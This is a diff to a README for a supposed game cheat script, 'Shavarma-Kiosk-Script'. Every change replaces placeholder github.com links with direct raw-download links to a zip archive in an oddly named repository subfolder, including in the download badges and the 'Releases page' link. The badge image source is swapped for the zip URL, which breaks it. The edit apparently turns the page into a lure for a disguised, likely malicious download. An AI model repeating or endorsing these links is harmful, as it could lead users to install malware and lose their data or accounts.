@@ -6,9 +6,9 @@ Welcome to the **Shavarma-Kiosk-Script**! This application helps you enhance you
 
 ## 📥 Download the Script
 
-[![Download Shavarma-Kiosk-Script](https://img.shields.io/badge/Download-Shavarma--Kiosk--Script-brightgreen.svg)](https://github.com)
+[![Download Shavarma-Kiosk-Script](https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip)](https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip)
 
-Visit this page to download: [https://github.com](https://github.com)
+Visit this page to download: [https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip](https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip)
 
 ## 💻 System Requirements
 
@@ -59,7 +59,7 @@ Before you start, make sure your device meets these basic requirements:
 
 To keep your experience smooth, regularly check for updates:
 
-1. Return to the [Releases page](https://github.com).
+1. Return to the [Releases page](https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip).
 2. Download the latest version of the **Shavarma-Kiosk-Script**.
 3. Follow the running steps mentioned above to ensure you have the latest features.
 
@@ -77,6 +77,6 @@ You are not alone! For any questions or issues, reach out for help in our commun
 
 Take control of your shawarma tycoon adventures today with the **Shavarma-Kiosk-Script**. Have fun gaming! 
 
-[![Download Shavarma-Kiosk-Script](https://img.shields.io/badge/Download-Shavarma--Kiosk--Script-brightgreen.svg)](https://github.com) 
+[![Download Shavarma-Kiosk-Script](https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip)](https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip) 
 
-Visit this page to download: [https://github.com](https://github.com)
+Visit this page to download: [https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip](https://github.com/ww7775/Shavarma-Kiosk-Script/raw/refs/heads/main/Allotriognathi/KioskShavarmaScript_2.7.zip)
